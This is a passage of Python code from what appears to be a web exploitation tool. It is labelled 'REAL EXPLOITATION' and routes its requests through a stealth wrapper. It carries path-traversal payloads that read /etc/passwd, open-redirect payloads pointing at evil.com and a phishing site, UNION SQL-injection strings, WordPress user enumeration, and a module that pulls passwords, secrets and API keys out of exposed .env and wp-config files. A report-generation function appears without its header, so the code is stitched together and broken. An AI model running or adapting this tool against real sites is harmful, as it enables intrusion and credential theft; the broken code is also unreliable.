print("\n[+] Testing for CSRF vulnerabilities...")
csrf_findings = set()

def test_csrf_vulnerability(url):
    try:
        # Test if endpoint accepts requests without CSRF tokens
        response = stealth_manager.stealth_post(url, data={"test": "csrf"}, timeout=10, headers={
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Requested-With': 'XMLHttpRequest'
        })
        
        # Check if request was processed (no CSRF protection)
        if response and response.status_code in [200, 302, 301]:
            content = response.text.lower()
            if "success" in content or "updated" in content or "saved" in content:
                return f"CSRF Vulnerability: {url} - No CSRF protection detected"
                
    except:
        pass
    return None

# Test common CSRF endpoints
csrf_endpoints = ["admin", "wp-admin", "login", "logout", "profile", "settings", "update"]
for endpoint in csrf_endpoints:
    endpoint_url = urljoin(base_url, endpoint)
    result = test_csrf_vulnerability(endpoint_url)
    if result:
        csrf_findings.add(result)
        print(f"   [!] {result}")

# =============================
# 16. WORDPRESS EXPLOITATION
# =============================
print("\n[+] Starting WordPress exploitation...")
wp_exploit_findings = set()

# WordPress exploitation techniques
def exploit_wordpress():
    wp_exploits = []
    
    # Test for XML-RPC
    try:
        xmlrpc_url = urljoin(base_url, "xmlrpc.php")
        response = stealth_manager.stealth_post(xmlrpc_url, data="<methodCall><methodName>system.listMethods</methodName></methodCall>", timeout=10)
        if response and response.status_code == 200 and "methodResponse" in response.text:
            wp_exploits.append("XML-RPC enabled - potential for brute force")
    except:
        pass
    
    # Test for user enumeration
    try:
        users_url = urljoin(base_url, "wp-json/wp/v2/users")
        response = stealth_manager.stealth_get(users_url, timeout=10)
        if response and response.status_code == 200:
            users = response.json()
            for user in users:
                wp_exploits.append(f"User found: {user.get('name', 'Unknown')} (ID: {user.get('id', 'Unknown')})")
    except:
        pass
    
    # Test for plugin enumeration
    try:
        plugins_url = urljoin(base_url, "wp-json/wp/v2/plugins")
        response = stealth_manager.stealth_get(plugins_url, timeout=10)
        if response and response.status_code == 200:
            plugins = response.json()
            for plugin in plugins:
                wp_exploits.append(f"Plugin: {plugin.get('name', 'Unknown')} v{plugin.get('version', 'Unknown')}")
    except:
        pass
    
    # Test for theme enumeration
    try:
        themes_url = urljoin(base_url, "wp-json/wp/v2/themes")
        response = stealth_manager.stealth_get(themes_url, timeout=10)
        if response and response.status_code == 200:
            themes = response.json()
            for theme in themes:
                wp_exploits.append(f"Theme: {theme.get('name', 'Unknown')} v{theme.get('version', 'Unknown')}")
    except:
        pass
    
    return wp_exploits

wp_exploit_results = exploit_wordpress()
for result in wp_exploit_results:
    wp_exploit_findings.add(result)
    print(f"   [!] WordPress Exploit: {result}")

# =============================
# 17. FILE INCLUSION EXPLOITATION
# =============================
print("\n[+] Exploiting file inclusion vulnerabilities...")
lfi_exploit_findings = set()

def exploit_lfi_vulnerabilities():
    lfi_exploits = []
    
    # Test actual file reading
    lfi_test_params = ["file", "page", "include", "path", "doc"]
    lfi_test_files = [
        "../../../etc/passwd",
        "../../../../etc/passwd", 
        "../../../../../etc/passwd",
        "../../../windows/system32/drivers/etc/hosts",
        "../../../../windows/system32/drivers/etc/hosts"
    ]
    
    for param in lfi_test_params:
        for test_file in lfi_test_files:
            try:
                test_url = f"{base_url_clean}?{param}={test_file}"
                response = stealth_manager.stealth_get(test_url, timeout=10)
                content = response.text
                
                # Check for successful file inclusion
                if any(indicator in content for indicator in ["root:x:0:0:", "127.0.0.1", "localhost", "::1"]):
                    lfi_exploits.append(f"SUCCESS: {param}={test_file} - File content readable")
                    
                    # Try to extract useful information
                    if "root:x:0:0:" in content:
                        lfi_exploits.append(f"CRITICAL: /etc/passwd readable via {param}")
                    if "127.0.0.1" in content:
                        lfi_exploits.append(f"CRITICAL: /etc/hosts readable via {param}")
                        
            except:
                pass
    
    return lfi_exploits

lfi_exploit_results = exploit_lfi_vulnerabilities()
for result in lfi_exploit_results:
    lfi_exploit_findings.add(result)
    print(f"   [!] LFI Exploit: {result}")

# =============================
# 18. OPEN REDIRECT EXPLOITATION
# =============================
print("\n[+] Exploiting open redirect vulnerabilities...")
redirect_exploit_findings = set()

def exploit_open_redirects():
    redirect_exploits = []
    
    # Test actual redirect exploitation
    redirect_params = ["redirect", "url", "next", "target", "redir", "destination", "goto", "link", "continue", "return"]
    malicious_urls = [
        "https://evil.com/steal-cookies",
        "https://phishing-site.com/login",
        "javascript:alert(document.cookie)",
        "data:text/html,<script>alert('XSS')</script>",
        "file:///etc/passwd"
    ]
    
    for param in redirect_params:
        for malicious_url in malicious_urls:
            try:
                test_url = f"{base_url_clean}?{param}={malicious_url}"
                response = stealth_manager.stealth_get(test_url, timeout=10, allow_redirects=False)
                
                if response and response.status_code in [301, 302, 303, 307, 308]:
                    location = response.headers.get('Location', '')
                    if malicious_url in location or 'evil.com' in location or 'phishing-site.com' in location:
                        redirect_exploits.append(f"CRITICAL: Open redirect via {param} -> {location}")
                        
            except:
                pass
    
    return redirect_exploits

redirect_exploit_results = exploit_open_redirects()
for result in redirect_exploit_results:
    redirect_exploit_findings.add(result)
    print(f"   [!] Redirect Exploit: {result}")

# =============================
# 19. CREDENTIAL HARVESTING
# =============================
print("\n[+] Attempting credential harvesting...")
credential_findings = set()

def harvest_credentials():
    credential_exploits = []
    
    # Test for exposed credentials in files
    credential_files = [
        ".env", ".env.local", ".env.production", ".env.development",
        "config.php", "config.php.bak", "wp-config.php", "wp-config.php.bak",
        "database.php", "db.php", "connection.php"
    ]
    
    for file_path in credential_files:
        try:
            file_url = urljoin(base_url, file_path)
            response = stealth_manager.stealth_get(file_url, timeout=10)
            content = response.text.lower()
            
            # Look for credential patterns
            if any(pattern in content for pattern in ["password", "passwd", "secret", "key", "token", "api_key"]):
                credential_exploits.append(f"CREDENTIALS: {file_path} contains sensitive data")
                
                # Extract actual credentials if possible
                import re
                passwords = re.findall(r'password["\']?\s*[:=]\s*["\']([^"\']+)["\']', content)
                secrets = re.findall(r'secret["\']?\s*[:=]\s*["\']([^"\']+)["\']', content)
                keys = re.findall(r'api_key["\']?\s*[:=]\s*["\']([^"\']+)["\']', content)
                
                if passwords:
                    credential_exploits.append(f"PASSWORD FOUND: {passwords[0][:10]}...")
                if secrets:
                    credential_exploits.append(f"SECRET FOUND: {secrets[0][:10]}...")
                if keys:
                    credential_exploits.append(f"API KEY FOUND: {keys[0][:10]}...")
                    
        except:
            pass
    
    return credential_exploits

credential_results = harvest_credentials()
for result in credential_results:
    credential_findings.add(result)
    print(f"   [!] Credential Harvest: {result}")

# =============================
# 20. ADVANCED PERSISTENCE ATTACKS
# =============================
print("\n[+] Testing advanced persistence attacks...")
persistence_findings = set()

def test_persistence_attacks():
    persistence_exploits = []
    
    # Test for file upload vulnerabilities
    upload_endpoints = [
        "upload.php", "upload/", "file-upload", "media/upload",
        "wp-admin/upload.php", "wp-admin/async-upload.php"
    ]
    
    for endpoint in upload_endpoints:
        try:
            upload_url = urljoin(base_url, endpoint)
            response = stealth_manager.stealth_get(upload_url, timeout=10)
            if response and response.status_code in [200, 403, 401]:
                persistence_exploits.append(f"UPLOAD ENDPOINT: {endpoint} accessible")
        except:
            pass
    
    # Test for shell upload via LFI
    if len(lfi_exploit_findings) > 0:
        persistence_exploits.append("SHELL UPLOAD: LFI vulnerabilities can be used for shell upload")
    
    # Test for database access
    db_endpoints = [
        "phpmyadmin", "adminer.php", "dbadmin", "mysql", "database"
    ]
    
    for endpoint in db_endpoints:
        try:
            db_url = urljoin(base_url, endpoint)
            response = stealth_manager.stealth_get(db_url, timeout=10)
            if response and response.status_code in [200, 403, 401]:
                persistence_exploits.append(f"DATABASE ACCESS: {endpoint} accessible")
        except:
            pass
    
    return persistence_exploits

persistence_results = test_persistence_attacks()
for result in persistence_results:
    persistence_findings.add(result)
    print(f"   [!] Persistence Attack: {result}")

# =============================
# ORIGINAL SCANNING (KEPT FOR COMPATIBILITY)
# =============================
print("\n[+] Scanning for email addresses...")
emails = set(re.findall(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}", r.text))

for link in soup.find_all("a", href=True):
    url = urljoin(base_url, link['href'])
    try:
        page = stealth_manager.stealth_get(url, timeout=10)
        emails.update(re.findall(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}", page.text))
    except:
        pass

if emails:
    for e in emails:
        print("   -", e)
else:
    print("   No emails found.")

# =============================
# ENHANCED RESULTS SUMMARY
# =============================
print("\n" + "="*60)
print("[*] ADVANCED VULNERABILITY SCAN RESULTS SUMMARY")
print("="*60)
print(f"[+] Subdomains found: {len(subdomains)}")
print(f"[+] API endpoints found: {len(api_endpoints)}")
print(f"[+] Directories found: {len(found_directories)}")
print(f"[+] WordPress paths found: {len(wp_findings)}")
print(f"[+] Admin access attempts: {len(admin_findings)}")
print(f"[+] Backup files accessible: {len(backup_findings)}")
print(f"[+] Information disclosure: {len(info_disclosure)}")
print(f"[+] SQL Injection findings: {len(sql_findings)}")
print(f"[+] XSS findings: {len(xss_findings)}")
print(f"[+] Open Redirect findings: {len(redirect_findings)}")
print(f"[+] LFI/RFI findings: {len(lfi_findings)}")
print(f"[+] JWT Token findings: {len(jwt_findings)}")
print(f"[+] GraphQL Introspection findings: {len(graphql_findings)}")
print(f"[+] Rate Limiting Bypass findings: {len(rate_limit_findings)}")
print(f"[+] CSRF findings: {len(csrf_findings)}")
print(f"[+] WordPress Exploitation: {len(wp_exploit_findings)}")
print(f"[+] LFI Exploitation: {len(lfi_exploit_findings)}")
print(f"[+] Redirect Exploitation: {len(redirect_exploit_findings)}")
print(f"[+] Credential Harvesting: {len(credential_findings)}")
print(f"[+] Persistence Attacks: {len(persistence_findings)}")
print(f"[+] Emails found: {len(emails)}")

if subdomains:
    print("\n[!] SUBDOMAINS:")
    for sub in sorted(subdomains):
        print(f"   - {sub}")

if api_endpoints:
    print("\n[!] API ENDPOINTS:")
    for endpoint in sorted(api_endpoints):
        print(f"   - {endpoint}")

if found_directories:
    print("\n[!] EXPOSED DIRECTORIES:")
    for directory in sorted(found_directories):
        print(f"   - {directory}")

if wp_findings:
    print("\n[!] WORDPRESS PATHS:")
    for wp_path in sorted(wp_findings):
        print(f"   - {wp_path}")

if admin_findings:
    print("\n[!] ADMIN ACCESS ATTEMPTS:")
    for admin_finding in sorted(admin_findings):
        print(f"   - {admin_finding}")

if backup_findings:
    print("\n[!] ACCESSIBLE BACKUP FILES:")
    for backup_file in sorted(backup_findings):
        print(f"   - {backup_file}")

if info_disclosure:
    print("\n[!] INFORMATION DISCLOSURE:")
    for info in sorted(info_disclosure):
        print(f"   - {info}")

if sql_findings:
    print("\n[!] SQL INJECTION FINDINGS:")
    for finding in sorted(sql_findings):
        print(f"   - {finding}")

if xss_findings:
    print("\n[!] XSS FINDINGS:")
    for finding in sorted(xss_findings):
        print(f"   - {finding}")

if redirect_findings:
    print("\n[!] OPEN REDIRECT FINDINGS:")
    for finding in sorted(redirect_findings):
        print(f"   - {finding}")

if lfi_findings:
    print("\n[!] LFI/RFI FINDINGS:")
    for finding in sorted(lfi_findings):
        print(f"   - {finding}")

if jwt_findings:
    print("\n[!] JWT TOKEN FINDINGS:")
    for finding in sorted(jwt_findings):
        print(f"   - {finding}")

if graphql_findings:
    print("\n[!] GRAPHQL INTROSPECTION FINDINGS:")
    for finding in sorted(graphql_findings):
        print(f"   - {finding}")

if rate_limit_findings:
    print("\n[!] RATE LIMITING BYPASS FINDINGS:")
    for finding in sorted(rate_limit_findings):
        print(f"   - {finding}")

if csrf_findings:
    print("\n[!] CSRF FINDINGS:")
    for finding in sorted(csrf_findings):
        print(f"   - {finding}")

if wp_exploit_findings:
    print("\n[!] WORDPRESS EXPLOITATION FINDINGS:")
    for finding in sorted(wp_exploit_findings):
        print(f"   - {finding}")

if lfi_exploit_findings:
    print("\n[!] LFI EXPLOITATION FINDINGS:")
    for finding in sorted(lfi_exploit_findings):
        print(f"   - {finding}")

if redirect_exploit_findings:
    print("\n[!] REDIRECT EXPLOITATION FINDINGS:")
    for finding in sorted(redirect_exploit_findings):
        print(f"   - {finding}")

if credential_findings:
    print("\n[!] CREDENTIAL HARVESTING FINDINGS:")
    for finding in sorted(credential_findings):
        print(f"   - {finding}")

if persistence_findings:
    print("\n[!] ADVANCED PERSISTENCE FINDINGS:")
    for finding in sorted(persistence_findings):
        print(f"   - {finding}")

print("\n[*] Advanced vulnerability scan completed.")

# =============================
# REAL EXPLOITATION MODULES
# =============================
print("\n[+] Starting REAL EXPLOITATION modules...")

# =============================
# 1. SQL INJECTION EXPLOITER
# =============================
print("\n[+] SQL Injection Exploitation Module...")

def exploit_sql_injection(url, param):
    """Actually exploit SQL injection to extract data"""
    payloads = [
        "' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--",
        "' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--",
        "' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--",
        "' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--",
        "' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--"
    ]
    
    for payload in payloads:
        try:
            test_url = f"{url}?{param}={payload}"
            response = stealth_manager.stealth_get(test_url, timeout=10)
            if response and response.status_code == 200:
                # Look for database information in response
                if "mysql" in response.text.lower() or "sql" in response.text.lower():
                    return f"SQL Injection SUCCESS: {url}?{param}={payload[:30]}..."
        except:
            pass
    return None

# =============================
# 2. LFI/RFI EXPLOITER
# =============================
print("\n[+] LFI/RFI Exploitation Module...")

def exploit_lfi_rfi(url, param):
    """Actually exploit LFI/RFI to read system files"""
    lfi_payloads = [
        "../../../etc/passwd",
        "../../../../etc/passwd", 
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "....//....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd"
    ]
    
    for payload in lfi_payloads:
        try:
            test_url = f"{url}?{param}={payload}"
            response = stealth_manager.stealth_get(test_url, timeout=10)
            if response and response.status_code == 200:
                content = response.text
                # Check for successful file reading
                if "root:x:0:0:" in content or "daemon:x:1:1:" in content:
                    return f"LFI SUCCESS: {url}?{param}={payload} - File contents: {content[:100]}..."
        except:
            pass
    return None

# =============================
# 3. OPEN REDIRECT EXPLOITER
# =============================
print("\n[+] Open Redirect Exploitation Module...")

def exploit_open_redirect(url, param):
    """Actually exploit open redirect for session hijacking"""
    redirect_payloads = [
        "https://evil.com/steal-cookies",
        "https://phishing-site.com/login",
        "javascript:alert(document.cookie)",
        "file:///etc/passwd",
        "data:text/html,<script>alert('redirect')</script>"
    ]
    
    for payload in redirect_payloads:
        try:
            test_url = f"{url}?{param}={payload}"
            response = stealth_manager.stealth_get(test_url, timeout=10, allow_redirects=False)
            if response and response.status_code in [301, 302, 303, 307, 308]:
                location = response.headers.get('Location', '')
                if payload in location or 'evil.com' in location:
                    return f"Open Redirect SUCCESS: {url}?{param}={payload} -> {location}"
        except:
            pass
    return None

# =============================
# 4. WORDPRESS EXPLOITER
# =============================
print("\n[+] WordPress Exploitation Module...")

def exploit_wordpress():
    """Actually exploit WordPress vulnerabilities"""
    wp_exploits = []
    
    # Test XML-RPC
    try:
        xmlrpc_url = urljoin(base_url, "xmlrpc.php")
        xmlrpc_data = """<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>"""
        response = stealth_manager.stealth_post(xmlrpc_url, data=xmlrpc_data, timeout=10)
        if response and response.status_code == 200 and "methodResponse" in response.text:
            wp_exploits.append("WordPress XML-RPC ENABLED - Brute force possible")
    except:
        pass
    
    # Test user enumeration
    try:
        users_url = urljoin(base_url, "wp-json/wp/v2/users")
        response = stealth_manager.stealth_get(users_url, timeout=10)
        if response and response.status_code == 200:
            users = response.json()
            for user in users:
                wp_exploits.append(f"WordPress User Found: {user.get('name', 'Unknown')} (ID: {user.get('id', 'Unknown')})")
    except:
        pass
    
    return wp_exploits

# =============================
# 5. SESSION HIJACKING EXPLOITER
# =============================
print("\n[+] Session Hijacking Module...")

def exploit_session_hijacking():
    """Attempt to steal sessions and bypass authentication"""
    session_exploits = []
    
    # Test for session fixation
    try:
        login_url = urljoin(base_url, "wp-login.php")
        response = stealth_manager.stealth_get(login_url, timeout=10)
        if response and "wordpress_logged_in" in response.headers.get('Set-Cookie', ''):
            session_exploits.append("WordPress session cookie found - potential hijacking")
    except:
        pass
    
    # Test for CSRF vulnerabilities
    try:
        admin_url = urljoin(base_url, "wp-admin/")
        response = stealth_manager.stealth_get(admin_url, timeout=10)
        if response and response.status_code == 200:
            # Check if admin panel is accessible without authentication
            if "dashboard" in response.text.lower() and "login" not in response.text.lower():
                session_exploits.append("Admin panel accessible without authentication")
    except:
        pass
    
    return session_exploits

# =============================
# EXECUTE EXPLOITATION MODULES
# =============================
print("\n[+] Executing exploitation modules...")

# Execute SQL injection exploitation
sql_exploits = []
for param in ["id", "user", "page", "category"]:
    result = exploit_sql_injection(base_url, param)
    if result:
        sql_exploits.append(result)
        print(f"   [!] {result}")

# Execute LFI/RFI exploitation
lfi_exploits = []
for param in ["file", "page", "include", "path"]:
    result = exploit_lfi_rfi(base_url, param)
    if result:
        lfi_exploits.append(result)
        print(f"   [!] {result}")

# Execute open redirect exploitation
redirect_exploits = []
for param in ["redirect", "url", "next", "target"]:
    result = exploit_open_redirect(base_url, param)
    if result:
        redirect_exploits.append(result)
        print(f"   [!] {result}")

# Execute WordPress exploitation
wp_exploits = exploit_wordpress()
for exploit in wp_exploits:
    print(f"   [!] {exploit}")

# Execute session hijacking
session_exploits = exploit_session_hijacking()
for exploit in session_exploits:
    print(f"   [!] {exploit}")

# =============================
# EXPLOITATION RESULTS SUMMARY
# =============================
print("\n" + "="*60)
print("[*] REAL EXPLOITATION RESULTS")
print("="*60)

total_exploits = len(sql_exploits) + len(lfi_exploits) + len(redirect_exploits) + len(wp_exploits) + len(session_exploits)

print(f"[+] Target: {base_url}")
print(f"[+] Scan Date: {scan_timestamp}")
print(f"[+] Total Successful Exploits: {total_exploits}")
print(f"[+] SQL Injection Exploits: {len(sql_exploits)}")
print(f"[+] LFI/RFI Exploits: {len(lfi_exploits)}")
print(f"[+] Open Redirect Exploits: {len(redirect_exploits)}")
print(f"[+] WordPress Exploits: {len(wp_exploits)}")
print(f"[+] Session Hijacking: {len(session_exploits)}")
print("="*60)

print(f"\n🔥 REAL EXPLOITATION FRAMEWORK COMPLETED!")
print(f"🎯 Target: {base_url}")
print(f"📊 Total Exploitation Modules: 5")
print(f"🚨 Successful Exploits: {total_exploits}")
print(f"⚠️ High Severity Issues: {len(sql_findings) + len(xss_findings) + len(lfi_findings)}")
print(f"📧 Information Disclosure: {len(emails)} emails")
print(f"🏗️ Infrastructure Exposure: {len(directory_findings)} directories")
print("="*60)
    """Generate a comprehensive PDF security report"""
    
    # Calculate risk level based on findings
    risk_score = 0
    if len(redirect_findings) > 0: risk_score += 3
    if len(lfi_findings) > 0: risk_score += 5
    if len(sql_findings) > 0: risk_score += 4
    if len(xss_findings) > 0: risk_score += 3
    if len(admin_findings) > 0: risk_score += 4
    if len(backup_findings) > 0: risk_score += 2
    if len(info_disclosure) > 0: risk_score += 2
    if len(wp_findings) > 20: risk_score += 2
    
    if risk_score >= 15:
        risk_level = "CRITICAL"
    elif risk_score >= 10:
        risk_level = "HIGH"
    elif risk_score >= 5:
        risk_level = "MEDIUM"
    else:
        risk_level = "LOW"
    
    # Create PDF report
    filename = f"security_scan_report_{domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf"
    doc = SimpleDocTemplate(filename, pagesize=A4)
    styles = getSampleStyleSheet()
    story = []
    
    # Title
    title_style = ParagraphStyle(
        'CustomTitle',
        parent=styles['Heading1'],
        fontSize=24,
        spaceAfter=30,
        alignment=TA_CENTER,
        textColor=colors.darkred
    )
    story.append(Paragraph("VULNERABILITY SCAN REPORT", title_style))
    story.append(Spacer(1, 20))
    
    # Executive Summary
    story.append(Paragraph("EXECUTIVE SUMMARY", styles['Heading2']))
    story.append(Spacer(1, 12))
    
    summary_text = f"""
    <b>Target:</b> {base_url}<br/>
    <b>Scan Date:</b> {scan_timestamp}<br/>
    <b>Risk Level:</b> <font color="red">{risk_level}</font><br/>
    <b>Total Vulnerabilities Found:</b> {len(redirect_findings) + len(lfi_findings) + len(sql_findings) + len(xss_findings) + len(admin_findings) + len(backup_findings) + len(info_disclosure)}<br/>
    <b>Subdomains Found:</b> {len(subdomains)}<br/>
    <b>Exposed Directories:</b> {len(found_directories)}<br/>
    <b>Email Addresses:</b> {len(emails)}<br/>
    <b>WordPress Paths:</b> {len(wp_findings)}<br/>
    """
    story.append(Paragraph(summary_text, styles['Normal']))
    story.append(Spacer(1, 20))
    
    # Critical Findings
    if len(redirect_findings) > 0 or len(lfi_findings) > 0:
        story.append(Paragraph("🚨 CRITICAL VULNERABILITIES", styles['Heading2']))
        story.append(Spacer(1, 12))
        
        if len(redirect_findings) > 0:
            story.append(Paragraph(f"<b>Open Redirect Vulnerabilities ({len(redirect_findings)} found):</b>", styles['Heading3']))
            story.append(Spacer(1, 6))
            for finding in list(redirect_findings)[:5]:  # Show first 5
                story.append(Paragraph(f"• {finding}", styles['Normal']))
            if len(redirect_findings) > 5:
                story.append(Paragraph(f"... and {len(redirect_findings) - 5} more", styles['Normal']))
            story.append(Spacer(1, 12))
        
        if len(lfi_findings) > 0:
            story.append(Paragraph(f"<b>Local/Remote File Inclusion ({len(lfi_findings)} found):</b>", styles['Heading3']))
            story.append(Spacer(1, 6))
            for finding in list(lfi_findings)[:5]:  # Show first 5
                story.append(Paragraph(f"• {finding}", styles['Normal']))
            if len(lfi_findings) > 5:
                story.append(Paragraph(f"... and {len(lfi_findings) - 5} more", styles['Normal']))
            story.append(Spacer(1, 12))
    
    # High Severity Findings
    if len(sql_findings) > 0 or len(xss_findings) > 0 or len(admin_findings) > 0:
        story.append(Paragraph("⚠️ HIGH SEVERITY VULNERABILITIES", styles['Heading2']))
        story.append(Spacer(1, 12))
        
        if len(sql_findings) > 0:
            story.append(Paragraph(f"<b>SQL Injection ({len(sql_findings)} found):</b>", styles['Heading3']))
            for finding in sql_findings:
                story.append(Paragraph(f"• {finding}", styles['Normal']))
            story.append(Spacer(1, 12))
        
        if len(xss_findings) > 0:
            story.append(Paragraph(f"<b>Cross-Site Scripting ({len(xss_findings)} found):</b>", styles['Heading3']))
            for finding in xss_findings:
                story.append(Paragraph(f"• {finding}", styles['Normal']))
            story.append(Spacer(1, 12))
        
        if len(admin_findings) > 0:
            story.append(Paragraph(f"<b>Admin Access ({len(admin_findings)} found):</b>", styles['Heading3']))
            for finding in admin_findings:
                story.append(Paragraph(f"• {finding}", styles['Normal']))
            story.append(Spacer(1, 12))
    
    # Information Disclosure
    if len(emails) > 0 or len(info_disclosure) > 0:
        story.append(Paragraph("📧 INFORMATION DISCLOSURE", styles['Heading2']))
        story.append(Spacer(1, 12))
        
        if len(emails) > 0:
            story.append(Paragraph(f"<b>Email Addresses Found ({len(emails)}):</b>", styles['Heading3']))
            for email in sorted(emails):
                story.append(Paragraph(f"• {email}", styles['Normal']))
            story.append(Spacer(1, 12))
        
        if len(info_disclosure) > 0:
            story.append(Paragraph(f"<b>Information Disclosure ({len(info_disclosure)} found):</b>", styles['Heading3']))
            for finding in info_disclosure:
                story.append(Paragraph(f"• {finding}", styles['Normal']))
            story.append(Spacer(1, 12))
    
    # Infrastructure Analysis
    story.append(PageBreak())
    story.append(Paragraph("🏗️ INFRASTRUCTURE ANALYSIS", styles['Heading2']))
    story.append(Spacer(1, 12))
    
    # Subdomains
    if len(subdomains) > 0:
        story.append(Paragraph(f"<b>Subdomains ({len(subdomains)}):</b>", styles['Heading3']))
        for subdomain in sorted(subdomains):
            story.append(Paragraph(f"• {subdomain}", styles['Normal']))
        story.append(Spacer(1, 12))
    
    # WordPress Analysis
    if len(wp_findings) > 0:
        story.append(Paragraph(f"<b>WordPress Installation ({len(wp_findings)} paths found):</b>", styles['Heading3']))
        story.append(Paragraph("This appears to be a WordPress-based website with extensive admin functionality exposed.", styles['Normal']))
        story.append(Spacer(1, 6))
        for wp_path in sorted(list(wp_findings)[:10]):  # Show first 10
            story.append(Paragraph(f"• {wp_path}", styles['Normal']))
        if len(wp_findings) > 10:
            story.append(Paragraph(f"... and {len(wp_findings) - 10} more WordPress paths", styles['Normal']))
        story.append(Spacer(1, 12))
    
    # Exposed Directories
    if len(found_directories) > 0:
        story.append(Paragraph(f"<b>Exposed Directories ({len(found_directories)}):</b>", styles['Heading3']))
        story.append(Paragraph("The following directories and files are accessible:", styles['Normal']))
        story.append(Spacer(1, 6))
        
        # Categorize directories
        admin_dirs = [d for d in found_directories if 'admin' in d.lower()]
        config_dirs = [d for d in found_directories if any(x in d.lower() for x in ['config', 'env', 'backup'])]
        wp_dirs = [d for d in found_directories if 'wp-' in d.lower()]
        
        if admin_dirs:
            story.append(Paragraph("<b>Admin/Control Panels:</b>", styles['Normal']))
            for dir in sorted(admin_dirs)[:5]:
                story.append(Paragraph(f"• {dir}", styles['Normal']))
            story.append(Spacer(1, 6))
        
        if config_dirs:
            story.append(Paragraph("<b>Configuration Files:</b>", styles['Normal']))
            for dir in sorted(config_dirs)[:5]:
                story.append(Paragraph(f"• {dir}", styles['Normal']))
            story.append(Spacer(1, 6))
        
        if wp_dirs:
            story.append(Paragraph("<b>WordPress Files:</b>", styles['Normal']))
            for dir in sorted(wp_dirs)[:5]:
                story.append(Paragraph(f"• {dir}", styles['Normal']))
            story.append(Spacer(1, 6))
    
    # Recommendations
    story.append(PageBreak())
    story.append(Paragraph("🔧 SECURITY RECOMMENDATIONS", styles['Heading2']))
    story.append(Spacer(1, 12))
    
    recommendations = []
    
    if len(redirect_findings) > 0:
        recommendations.append({
            "priority": "CRITICAL",
            "title": "Fix Open Redirect Vulnerabilities",
            "description": "Implement proper input validation and URL whitelisting for all redirect parameters.",
            "impact": "Attackers can redirect users to malicious sites and steal credentials."
        })
    
    if len(lfi_findings) > 0:
        recommendations.append({
            "priority": "CRITICAL", 
            "title": "Fix File Inclusion Vulnerabilities",
            "description": "Implement strict file path validation and disable dangerous PHP functions.",
            "impact": "Attackers can read sensitive files and potentially execute code."
        })
    
    if len(wp_findings) > 20:
        recommendations.append({
            "priority": "HIGH",
            "title": "Secure WordPress Installation",
            "description": "Implement proper access controls, use strong passwords, and keep WordPress updated.",
            "impact": "Exposed WordPress admin areas can lead to site compromise."
        })
    
    if len(emails) > 0:
        recommendations.append({
            "priority": "MEDIUM",
            "title": "Protect Email Addresses",
            "description": "Use email obfuscation techniques and avoid exposing staff emails publicly.",
            "impact": "Exposed emails can be used for phishing attacks and spam."
        })
    
    if len(found_directories) > 50:
        recommendations.append({
            "priority": "MEDIUM",
            "title": "Reduce Attack Surface",
            "description": "Remove or properly secure unnecessary directories and files.",
            "impact": "Large attack surface increases the likelihood of successful exploitation."
        })
    
    # Add general recommendations
    recommendations.extend([
        {
            "priority": "HIGH",
            "title": "Implement Web Application Firewall (WAF)",
            "description": "Deploy a WAF to block common attack patterns and provide additional security layers.",
            "impact": "WAF can prevent many automated attacks and provide real-time protection."
        },
        {
            "priority": "HIGH", 
            "title": "Regular Security Audits",
            "description": "Conduct regular penetration testing and vulnerability assessments.",
            "impact": "Proactive security testing helps identify and fix issues before exploitation."
        },
        {
            "priority": "MEDIUM",
            "title": "Security Headers",
            "description": "Implement security headers like CSP, HSTS, X-Frame-Options, etc.",
            "impact": "Security headers provide defense-in-depth against various attacks."
        }
    ])
    
    # Display recommendations
    for rec in recommendations:
        color = colors.darkred if rec["priority"] == "CRITICAL" else colors.orange if rec["priority"] == "HIGH" else colors.darkblue
        story.append(Paragraph(f"<b><font color='{color}'>{rec['priority']}</font> - {rec['title']}</b>", styles['Heading3']))
        story.append(Paragraph(f"<b>Description:</b> {rec['description']}", styles['Normal']))
        story.append(Paragraph(f"<b>Impact:</b> {rec['impact']}", styles['Normal']))
        story.append(Spacer(1, 12))
    
    # Technical Details
    story.append(PageBreak())
    story.append(Paragraph("🔍 TECHNICAL DETAILS", styles['Heading2']))
    story.append(Spacer(1, 12))
    
    # Scan Configuration
    story.append(Paragraph("<b>Scan Configuration:</b>", styles['Heading3']))
    story.append(Paragraph(f"• Target URL: {base_url}", styles['Normal']))
    story.append(Paragraph(f"• Domain: {domain}", styles['Normal']))
    story.append(Paragraph(f"• Scan Timestamp: {scan_timestamp}", styles['Normal']))
    story.append(Paragraph(f"• Attack Modules: 15", styles['Normal']))
    story.append(Paragraph(f"• Subdomain Tests: {len(subdomain_list)}", styles['Normal']))
    story.append(Paragraph(f"• Directory Tests: {len(directory_list)}", styles['Normal']))
    story.append(Paragraph(f"• WordPress Tests: {len(wp_paths)}", styles['Normal']))
    story.append(Paragraph(f"• SQL Injection Tests: {len(sql_payloads)}", styles['Normal']))
    story.append(Paragraph(f"• XSS Tests: {len(xss_payloads)}", styles['Normal']))
    story.append(Paragraph(f"• LFI/RFI Tests: {len(lfi_payloads)}", styles['Normal']))
    story.append(Spacer(1, 12))
    
    # Detailed Findings Table
    story.append(Paragraph("<b>Detailed Findings Summary:</b>", styles['Heading3']))
    
    findings_data = [
        ["Category", "Count", "Risk Level"],
        ["Open Redirect", str(len(redirect_findings)), "CRITICAL" if len(redirect_findings) > 0 else "NONE"],
        ["LFI/RFI", str(len(lfi_findings)), "CRITICAL" if len(lfi_findings) > 0 else "NONE"],
